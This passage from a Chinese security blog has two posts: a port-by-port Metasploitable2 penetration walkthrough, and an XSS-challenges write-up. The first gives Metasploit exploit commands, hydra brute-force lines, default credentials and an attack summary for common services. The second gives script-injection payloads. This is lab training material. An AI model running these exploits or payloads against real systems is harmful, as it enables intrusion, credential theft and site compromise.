<p>PHP-CGI远程代码执行漏洞（CVE-2012-1823）<br>影响版本 php &lt; 5.3.12 or php &lt; 5.4.2</p>
</blockquote>
<blockquote>
<p>msf &gt; search cve:2012-1823</p>
<p>msf &gt; use exploit/multi/http/php_cgi_arg_injection</p>
<p>msf exploit(php_cgi_arg_injection) &gt; show options</p>
<p>msf exploit(php_cgi_arg_injection) &gt; set rhost 192.168.211.157</p>
<p>rhost =&gt; 192.168.211.157</p>
<p>msf exploit(php_cgi_arg_injection) &gt; run</p>
</blockquote>
<p><img src="/2020/06/15/Metasploitable2/1591864645403.png" alt="1591864645403"></p>
<p>成功获得会话</p>
<p><img src="/2020/06/15/Metasploitable2/1591864665322.png" alt="1591864665322"></p>
<h2 id="139-445端口"><a href="#139-445端口" class="headerlink" title="139/445端口"></a>139/445端口</h2><p><strong>139端口是为‘NetBIOS SessionService’提供的，主要用于提供windows文件和打印机共享以及UNIX中的Samba服务。</strong></p>
<p><strong>445端口也用于提供windows文件和打印机共享，在内网环境中使用的很广泛。这两个端口同样属于重点攻击对象，139/445端口曾出现过许多严重级别的漏洞。下面剖析渗透此类端口的基本思路。</strong></p>
<p><strong>对于开放139/445端口的主机，一般尝试利用溢出漏洞对远程主机进行溢出攻击，成功后直接获得系统权限。利用msf的ms-017永恒之蓝。（<a href="https://blog.csdn.net/qq_41880069/article/details/82908131）" target="_blank" rel="noopener">https://blog.csdn.net/qq_41880069/article/details/82908131）</a></strong><br><strong>对于攻击只开放445端口的主机，黑客一般使用工具‘MS06040’或‘MS08067’.可使用专用的445端口扫描器进行扫描。NS08067溢出工具对windows2003系统的溢出十分有效，工具基本使用参数在cmd下会有提示。（<a href="https://blog.csdn.net/god_7z1/article/details/6773652）" target="_blank" rel="noopener">https://blog.csdn.net/god_7z1/article/details/6773652）</a></strong><br><strong>对于开放139/445端口的主机，黑客一般使用IPC$进行渗透。在没有使用特点的账户和密码进行空连接时，权限是最小的。获得系统特定账户和密码成为提升权限的关键了，比如获得administrator账户的口令。（<a href="https://blog.warhut.cn/dmbj/145.html）" target="_blank" rel="noopener">https://blog.warhut.cn/dmbj/145.html）</a></strong><br><strong>对于开放139/445端口的主机，可利用共享获取敏感信息，这也是内网渗透中收集信息的基本途径。</strong></p>
<p>该端口开放的服务为Samba smbd 3.X-4.X</p>
<blockquote>
<p>search samba</p>
<p>use exploit/multi/samba/usermap_script</p>
<p>set rhosts 192.168.211.157</p>
<p>run</p>
</blockquote>
<p><img src="/2020/06/15/Metasploitable2/1591865799083.png" alt="1591865799083"></p>
<h2 id="2121端口"><a href="#2121端口" class="headerlink" title="2121端口"></a>2121端口</h2><p>改端口仍然是ftp端口，可以使用爆破</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">hydra</span> 192<span class="selector-class">.168</span><span class="selector-class">.211</span><span class="selector-class">.157</span> <span class="selector-tag">-s</span> 2121 <span class="selector-tag">ftp</span> <span class="selector-tag">-L</span> <span class="selector-tag">user</span><span class="selector-class">.txt</span> <span class="selector-tag">admin</span> <span class="selector-tag">-P</span> <span class="selector-tag">password</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/15/Metasploitable2/1591867632649.png" alt="1591867632649"></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">ftp <span class="number">192.168</span><span class="number">.211</span><span class="number">.157</span> <span class="number">2121</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/15/Metasploitable2/1591867673441.png" alt="1591867673441"></p>
<h2 id="2409端口"><a href="#2409端口" class="headerlink" title="2409端口"></a>2409端口</h2><p>NFS（Network File System）即网络文件系统，是FreeBSD支持的文件系统中的一种，它允许网络中的计算机之间通过TCP/IP网络共享资源。</p>
<p>在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。如今NFS具备了防止被利用导出文件夹的功能，但遗留系统中的NFS服务配置不当，则仍可能遭到恶意攻击者的利用。</p>
<ol>
<li>未授权访问（[<a href="https://www.freebuf.com/articles/network/159468.html）" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/159468.html）</a>(<a href="http://www.secist.com/archives/6192.htm" target="_blank" rel="noopener">http://www.secist.com/archives/6192.htm</a>)</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">scanner/nfs/nfsmount</span><br></pre></td></tr></table></figure>

<h2 id="3306端口"><a href="#3306端口" class="headerlink" title="3306端口"></a>3306端口</h2><p>该端口为MySQL数据库默认端口，常用的攻击手法有</p>
<blockquote>
<p>爆破：弱口令<br>身份认证漏洞：CVE-2012-2122<br>拒绝服务攻击：利用sql语句是服务器进行死循环打死服务器<br>Phpmyadmin万能密码绕过：用户名：‘localhost’@‘@” 密码任意</p>
</blockquote>
<p>爆破</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">hydra</span> 192<span class="selector-class">.168</span><span class="selector-class">.211</span><span class="selector-class">.157</span> <span class="selector-tag">-s</span> 3306 <span class="selector-tag">mysql</span> <span class="selector-tag">-L</span> <span class="selector-tag">user</span><span class="selector-class">.txt</span>  <span class="selector-tag">-P</span> <span class="selector-tag">password</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure>

<h2 id="3632端口"><a href="#3632端口" class="headerlink" title="3632端口"></a>3632端口</h2><p><strong>Distcc用于将大规模的代码放到网络服务器上的分布式编译，但是如果配置不严格，容易被滥用执行命令，该漏洞是 XCode 1.5 版本及其他版本的 distcc 2.x 版本配署对于服务器端口的访问不限制造成的。<br>简单的说就是服务对端口和执行的任务检查不够严格，从而造成攻击者可以利用分布式的编译任务执行自己想要执行的命令。</strong></p>
<p>使用msf攻击</p>
<blockquote>
<p>use exploit/unix/misc/distcc_exec</p>
<p>set rhosts 192.168.211.157</p>
</blockquote>
<p><img src="/2020/06/15/Metasploitable2/1591884406824.png" alt="1591884406824"></p>
<h2 id="5432端口"><a href="#5432端口" class="headerlink" title="5432端口"></a>5432端口</h2><p>PostgreSQL是一种特性非常齐全的自由软件的对象–关系型数据库管理系统，可以说是目前世界上最先进，功能最强大的自由数据库管理系统。包括kali系统中msf也使用这个数据库；浅谈postgresql数据库攻击技术 大部分关于它的攻击依旧是sql注入，所以注入才是数据库不变的话题。<br> （1）爆破：弱口令：postgres postgres<br> （2）缓冲区溢出：CVE-2014-2669<a href="http://drops.xmd5.com/static/drops/tips-6449.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/tips-6449.html</a><br> （3）远程代码执行：CVE-2018-1058。<a href="https://www.secpulse.com/archives/69153.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/69153.html</a></p>
<ol>
<li>爆破：</li>
</ol>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">hydra</span> 192<span class="selector-class">.168</span><span class="selector-class">.211</span><span class="selector-class">.157</span> <span class="selector-tag">-s</span> 5432 <span class="selector-tag">postgres</span> <span class="selector-tag">-L</span> <span class="selector-tag">user</span><span class="selector-class">.txt</span>  <span class="selector-tag">-P</span> <span class="selector-tag">password</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/15/Metasploitable2/1591881378614.png" alt="1591881378614"></p>
<p>或者使用msf</p>
<blockquote>
<p>use auxiliary/scanner/postgres/postgres_login</p>
<p>set rhosts 192.168.211.157</p>
</blockquote>
<p><img src="/2020/06/15/Metasploitable2/1591881465105.png" alt="1591881465105"></p>
<p>远程登录</p>
<blockquote>
<p>psql -h 192.168.211.157 –u postgres</p>
</blockquote>
<p><img src="/2020/06/15/Metasploitable2/1591881659308.png" alt="1591881659308"></p>
<h2 id="5900端口"><a href="#5900端口" class="headerlink" title="5900端口"></a>5900端口</h2><p>5900端口是优秀远程控制软件VNC的默认监听端口，此软件由著名的AT&amp;T的欧洲研究实验室开发的。</p>
<p>VNC是在基于unix和linux操作系统的免费的开放源码软件，远程控制能力强大，高效实用，其性能可以和windows和MAC中的任何一款控制软件媲美。对于该端口的渗透，思路如下：</p>
<ol>
<li>VNC软件存在密码验证绕过漏洞，此高危漏洞可以使得恶意攻击者不需要密码就可以登录到一个远程系统。</li>
<li>cain同样支持对VNC的嗅探，同时支持端口修改。</li>
<li>VNC的配置信息同样被写入注册表系统中，其中包括连接的密码和端口。利用webshell的注册表读取功能进行读取加密算法，然后破解。</li>
<li>VNC拒绝服务攻击（CVE-2015-5239）。（<a href="http://blogs.360.cn/post/vnc%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9Ecve-2015-5239%E5%88%86%E6%9E%90.html）" target="_blank" rel="noopener">http://blogs.360.cn/post/vnc%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9Ecve-2015-5239%E5%88%86%E6%9E%90.html）</a></li>
<li>VNC权限提升（CVE-2013-6886）。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> vnc未授权访问</span><br><span class="line">	auxiliary/scanner/vnc/vnc_none_auth</span><br></pre></td></tr></table></figure>



<h2 id="6667端口"><a href="#6667端口" class="headerlink" title="6667端口"></a>6667端口</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">irc实时聊天服务，可提权</span><br><span class="line"> 	exploit/unix/irc/unreal_ircd_3281_backdoor</span><br></pre></td></tr></table></figure>

<blockquote>
<p>use exploit/unix/irc/unreal_ircd_3281_backdoor</p>
<p>set rhosts 192.168.211.157</p>
<p>run</p>
</blockquote>
<p><img src="/2020/06/15/Metasploitable2/1591887506202.png" alt="1591887506202"></p>
<h2 id="8180端口"><a href="#8180端口" class="headerlink" title="8180端口"></a>8180端口</h2><p>Apache Tomcat弱口令</p>
<p><img src="/2020/06/15/Metasploitable2/1591869167703.png" alt="1591869167703"></p>
<p>使用msf进行攻击</p>
<blockquote>
<p>search tomcat</p>
<p>use auxiliary/scanner/http/tomcat_mgr_login</p>
<p>set RHOSTS 192.168.211.157</p>
<p>set RPORT 8180</p>
<p>run</p>
</blockquote>
<p><img src="/2020/06/15/Metasploitable2/1591869383056.png" alt="1591869383056"></p>
<p>之后再使用exploit/multi/http/tomcat_mgr_upload模块进行getshell</p>
<blockquote>
<p>use exploit/multi/http/tomcat_mgr_upload</p>
<p>msf exploit(multi/http/tomcat_mgr_upload) &gt; set rhost 192.168.211.157</p>
<p>msf exploit(multi/http/tomcat_mgr_upload) &gt; set rport 8180</p>
<p>msf exploit(multi/http/tomcat_mgr_upload) &gt; set httpusername tomcat</p>
<p>msf exploit(multi/http/tomcat_mgr_upload) &gt; set httppassword tomcat</p>
<p>msf exploit(multi/http/tomcat_mgr_upload) &gt; exploit</p>
</blockquote>
<p><img src="/2020/06/15/Metasploitable2/1591870573718.png" alt="1591870573718"></p>
<h1 id="汇总"><a href="#汇总" class="headerlink" title="汇总"></a>汇总</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#21端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 爆破（hydra、msf中的ftp爆破模块）</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> ftp匿名访问：用户名：anonymous 密码：为空或者任意邮箱</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> 后门vsftpd ：version2到<span class="number">2.3</span><span class="number">.4</span>存在后门漏洞，攻击者可以通过该漏洞获取root权限。</span><br><span class="line">   unix/ftp/vsftpd_234_backdoor</span><br><span class="line">      （https:<span class="comment">//www.freebuf.com/column/143480.html）</span></span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#22端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 爆破（hydra、msf中的ssh爆破模块） </span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> openssh 用户枚举 CVE<span class="number">-2018</span><span class="number">-15473</span></span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#23端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 爆破（hydra、msf中的ssh爆破模块）</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#80端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> MS15<span class="number">-034</span> http.sys远程代码执行漏洞（windoiws <span class="number">8.1</span>, <span class="number">2012</span>, <span class="keyword">or</span> <span class="number">2012</span>R2有效。）</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> IIS web dav缓冲区溢出（工具：WebDAVScan）</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#161端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> snmp默认团体名漏洞</span><br><span class="line">   （nmap -sU -p161 --script=snmp-brute.nse IP）</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#135&amp;139&amp;445端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> MS17<span class="number">-010</span>永恒之蓝</span><br><span class="line">   （auxiliary/scanner/smb/smb_ms17_010）</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#443端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 心脏出血</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#873端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> rsync未授权访问</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#1099端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> java_rmi反序列化远程命令执行</span><br><span class="line">   nmap -sV -p <span class="number">1099</span> IP --script=rmi-vuln-classloader</span><br><span class="line">   注册信息暴露</span><br><span class="line">   nmap -sV -p <span class="number">1099</span> IP --script=rmi-dumpregistry.nse </span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#1433端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> SQLServer暴力破解</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#1521端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 弱口令 </span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> Oracle tns中间人远程注册投毒漏洞</span><br><span class="line">   （auxiliary/scanner/oracle/tnspoison_checker）</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#1883端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> mqtt未授权访问</span><br><span class="line">   使用Nmap探测mqtt服务</span><br><span class="line">   使用MQTT.fx检测是否存在未授权</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#2049端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> nfs网络文件系统敏感信息泄漏漏洞（scanner/nfs/nfsmount）</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#2181端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> zookeeper未授权访问</span><br><span class="line">   执行以下命令即可远程获取该服务器的环境</span><br><span class="line">   <span class="keyword">echo</span> envi | nc ip port </span><br><span class="line">   直接连接：</span><br><span class="line">   ./zkCli.sh -server ip:port</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#2375端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> docker未授权访问</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#3306端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> Mysql弱口令</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#3389端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 远程桌面弱口令</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> MS12<span class="number">-020</span></span><br><span class="line">   检测auxiliary/scanner/rdp/ms12_020_check</span><br><span class="line">    	 Dos攻击模块auxiliary/dos/windows/rdp/ms12_020_maxchannelids</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> CVE<span class="number">-2019</span><span class="number">-0708</span></span><br><span class="line">   auxiliary/scanner/rdp/cve_2019_0708_bluekeep</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#5900端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> vnc未授权访问</span><br><span class="line">   auxiliary/scanner/vnc/vnc_none_auth</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#6000端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> X11弱口令 </span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> X11未授权访问</span><br><span class="line">   auxiliary/scanner/x11/open_x11</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#6379端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> redis未授权访问（dbscanner）</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#6666&amp;6667端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> irc实时聊天服务，可提权</span><br><span class="line">   exploit/unix/irc/unreal_ircd_3281_backdoor</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#7001&amp;7002端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> weblogic反序列化</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> 控制台弱口令</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#7777端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> jdwp-java远程命令</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#8080端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> Tomcat弱口令</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> 危险的Http请求</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> Tomcat远程代码执行漏洞（https:<span class="comment">//www.freebuf.com/column/159200.html）</span></span><br><span class="line">   Tomcat任意文件上传。（http:<span class="comment">//liehu.tass.com.cn/archives/836）</span></span><br><span class="line">   Tomcat远程代码执行&amp;信息泄露。（https:<span class="comment">//paper.seebug.org/399/）</span></span><br><span class="line">   Jboss远程代码执行。（http:<span class="comment">//mobile.www.cnblogs.com/Safe3/archive/2010/01/08/1642371.html）</span></span><br><span class="line">   Jboss反序列化漏洞。（https:<span class="comment">//www.zybuluo.com/websec007/note/838374）</span></span><br><span class="line">   Jboss漏洞利用。（https:<span class="comment">//blog.csdn.net/u011215939/article/details/79141624）</span></span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#8161端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> activemq远程代码执行</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> activemq未授权访问（弱口令）</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#9000端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> fastcgi远程代码执行</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="comment">#9001端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> supervisor远程命令执行</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#9090端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> websphere爆破/java反序列化/弱口令</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#9200端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> elasticsearch未授权访问</span><br><span class="line">   访问URL即可</span><br><span class="line">   http:<span class="comment">//IP:9200/_nodes</span></span><br><span class="line">   http:<span class="comment">//IP:9200/_river</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#11211端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> memcached未授权访问(dbscanner)</span><br><span class="line">   telnet &lt;target&gt; <span class="number">11211</span></span><br><span class="line">   nc -vv &lt;target&gt; <span class="number">11211</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#12345端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 达梦数据库默认口令</span><br><span class="line">   账号：SYSDBA</span><br><span class="line">    	密码SYSDBA</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#27017端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> mongodb未授权访问</span><br><span class="line">   auxiliary/scanner/mongodb/mongodb_login</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#50070端口</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> hadoop未授权访问</span><br></pre></td></tr></table></figure>

<p>   原文链接：<a href="https://blog.csdn.net/Alluresec/article/details/103171729" target="_blank" rel="noopener">https://blog.csdn.net/Alluresec/article/details/103171729</a></p>
<p> <a href="https://miraitowa2.top/2019/03/21/%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">参考文章</a></p>
]]></content>
      <tags>
        <tag>靶机渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS-challenges</title>
    <url>/2020/03/04/XSS-challenges/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;前面总结了一些xss的基础知识，这一篇准备完成xss-challenges平台的一些题目。xss-challenges是一个模仿真实xss挖洞的情景，在XSS Challenges练习过程中，我们需要用浏览器中的f12中搜索（），找出我们控制的代码所在的位置，然后思考那些个位置哪个或哪几个位置可以被注入我们想要的代码，然后结合上下文进行各种脑洞绕过。<a id="more"></a></p>
<h1 id="xss-challenges"><a href="#xss-challenges" class="headerlink" title="xss-challenges"></a>xss-challenges</h1><h2 id="Stage-1"><a href="#Stage-1" class="headerlink" title="Stage #1"></a>Stage #1</h2><p>第一关没有什么过滤，直接输入payload</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.domain)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/04/XSS-challenges/1.png" alt="img"></p>
<h2 id="Stage-2"><a href="#Stage-2" class="headerlink" title="Stage #2"></a>Stage #2</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">在我们输入<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.domain)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>的时候并没有弹窗</span><br></pre></td></tr></table></figure>

<p>f12查看元素<br><img src="/2020/03/04/XSS-challenges/2.png" alt="img"><br>发现输入的语句在value中，这是我们需要将前后的双引号闭合，输入</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">123"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.domain)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">"</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/04/XSS-challenges/3.png" alt="img"></p>
<h2 id="Stage-3"><a href="#Stage-3" class="headerlink" title="Stage #3"></a>Stage #3</h2><p><img src="/2020/03/04/XSS-challenges/4.png" alt="img"><br>第四关发现有两个参数，第一个参数尝试后无果，直接在元素中修改第二个元素<br><img src="/2020/03/04/XSS-challenges/5.png" alt="img"><br>修改后在上方选择该语句并提交，成功弹窗<br><img src="/2020/03/04/XSS-challenges/6.png" alt="img"><br><img src="/2020/03/04/XSS-challenges/7.png" alt="img"></p>
<h2 id="Stage-4"><a href="#Stage-4" class="headerlink" title="Stage #4"></a>Stage #4</h2><p>在尝试几种方法无果后，抓包发现有三个参数<br><img src="/2020/03/04/XSS-challenges/8.png" alt="img"><br>修改第三个参数</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.domain)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>但是并没有弹窗，查看源代码发现没有闭合引号</p>
<p><img src="/2020/03/04/XSS-challenges/9.png" alt="img"></p>
<p>于是构造</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">12"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.domain)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">"123</span></span></span><br></pre></td></tr></table></figure>

<p>成功弹窗<br><img src="/2020/03/04/XSS-challenges/10.png" alt="img"></p>
<h2 id="Stage-5"><a href="#Stage-5" class="headerlink" title="Stage #5"></a>Stage #5</h2><p>当我输入payload时，发现输入框限制了输入长度，于是在元素中尝试修改输入长度<br><img src="/2020/03/04/XSS-challenges/11.png" alt><br>再次输入payload成功弹窗,这里也要闭合前面的引号</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">123"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.domain)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">"</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/04/XSS-challenges/12.png" alt></p>
<h2 id="Stage-6"><a href="#Stage-6" class="headerlink" title="Stage #6"></a>Stage #6</h2><p>当我们输入payload的时候发现&lt;&gt;被替换成&amp;gt;这时我们可以构造on事件<br><img src="/2020/03/04/XSS-challenges/13.png" alt><br>on事件介绍：<br>在现代浏览器中都内置有大量的事件处理器。这些处理器会监视特定的条件或用户行为，例如鼠标单击或浏览器窗口中完成加载某个图像。通过使用客户端的JavaScript，可以将某些特定的事件处理器作为属性添加给特定的标签，并可以在事件发生时执行一个或多个JavaScript命令或函数。下面是一些常见的on事件</p>
<table>
<thead>
<tr>
<th><a href="https://www.w3school.com.cn/tags/event_onclick.asp" target="_blank" rel="noopener">onclick</a></th>
<th>script</th>
<th>元素上发生鼠标点击时触发。</th>
</tr>
</thead>
<tbody><tr>
<td><a href="https://www.w3school.com.cn/tags/event_ondblclick.asp" target="_blank" rel="noopener">ondblclick</a></td>
<td>script</td>
<td>元素上发生鼠标双击时触发。</td>
</tr>
<tr>
<td>ondrag</td>
<td>script</td>
<td>元素被拖动时运行的脚本。</td>
</tr>
<tr>
<td>ondragend</td>
<td>script</td>
<td>在拖动操作末端运行的脚本。</td>
</tr>
<tr>
<td>ondragenter</td>
<td>script</td>
<td>当元素元素已被拖动到有效拖放区域时运行的脚本。</td>
</tr>
<tr>
<td>ondragleave</td>
<td>script</td>
<td>当元素离开有效拖放目标时运行的脚本。</td>
</tr>
<tr>
<td>ondragover</td>
<td>script</td>
<td>当元素在有效拖放目标上正在被拖动时运行的脚本。</td>
</tr>
<tr>
<td>ondragstart</td>
<td>script</td>
<td>在拖动操作开端运行的脚本。</td>
</tr>
<tr>
<td>ondrop</td>
<td>script</td>
<td>当被拖元素正在被拖放时运行的脚本。</td>
</tr>
<tr>
<td><a href="https://www.w3school.com.cn/tags/event_onmousedown.asp" target="_blank" rel="noopener">onmousedown</a></td>
<td>script</td>
<td>当元素上按下鼠标按钮时触发。</td>
</tr>
<tr>
<td><a href="https://www.w3school.com.cn/tags/event_onmousemove.asp" target="_blank" rel="noopener">onmousemove</a></td>
<td>script</td>
<td>当鼠标指针移动到元素上时触发。</td>
</tr>
<tr>
<td><a href="https://www.w3school.com.cn/tags/event_onmouseout.asp" target="_blank" rel="noopener">onmouseout</a></td>
<td>script</td>
<td>当鼠标指针移出元素时触发。</td>
</tr>
<tr>
<td><a href="https://www.w3school.com.cn/tags/event_onmouseover.asp" target="_blank" rel="noopener">onmouseover</a></td>
<td>script</td>
<td>当鼠标指针移动到元素上时触发。</td>
</tr>
<tr>
<td><a href="https://www.w3school.com.cn/tags/event_onmouseup.asp" target="_blank" rel="noopener">onmouseup</a></td>
<td>script</td>
<td>当在元素上释放鼠标按钮时触发。</td>
</tr>
<tr>
<td>onmousewheel</td>
<td>script</td>
<td>当鼠标滚轮正在被滚动时运行的脚本。</td>
</tr>
<tr>
<td>onscroll</td>
<td>script</td>
<td>当元素滚动条被滚动时运行的脚本。</td>
</tr>
</tbody></table>
<p>构造payload</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="string">"onmouseover="</span><span class="function"><span class="title">alert</span>(<span class="variable">document.domain</span>)</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/04/XSS-challenges/14.png" alt><br>当我们鼠标移动到输入框时触发事件<br><img src="/2020/03/04/XSS-challenges/15.png" alt><br>还可以使用其他的事件进行触发xss如:</p>
<figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line"><span class="number">1561513</span><span class="string">"onclick ="</span>alert(<span class="built_in">document</span>.domain)<span class="comment">#当我们点击输入框是就会弹出对话框</span></span><br></pre></td></tr></table></figure>

